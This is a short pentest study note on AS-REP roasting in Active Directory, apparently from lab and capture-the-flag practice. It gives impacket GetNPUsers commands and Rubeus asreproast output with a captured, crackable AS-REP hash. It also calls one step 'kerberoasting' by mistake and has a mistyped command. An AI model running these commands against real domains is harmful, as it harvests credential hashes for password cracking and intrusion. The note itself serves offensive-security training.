
---

ASREPRoasting occurs when a user account has the privilege "Does not require pre-authentication" set.
This means that the account does not need to provide valid identification before requesting a Kerberos Ticket (TGT) on the specified user account.
## Syntax

Utilizing impacket-GetNPUsers will give us the TGT of users with this privileges set.

```
impacket-GetNPUsers -dc-ip 10.10.18.74 "spookysec.local/svc-admin" -no-pass
```

```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py thm.corp/ -no-pass -usersfile ../Exploiting/OSCP_Prep/THM/ActiveDirectory/Reset/users.txt
```

With multiple users We can create a users’ list `users.txt`, and then use the impacket `GetNPUsers.py` script to perform kerberoasting.

```
impacketGetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161
```
## Internal ASREP-Roasting

Since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options to Rubeus except **asreproast**. Rubeus will automatically identify vulnerable user accounts. We also add the flag **/nowrap** to prevent new lines being added to the resulting AS-REP hashes.

```
PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```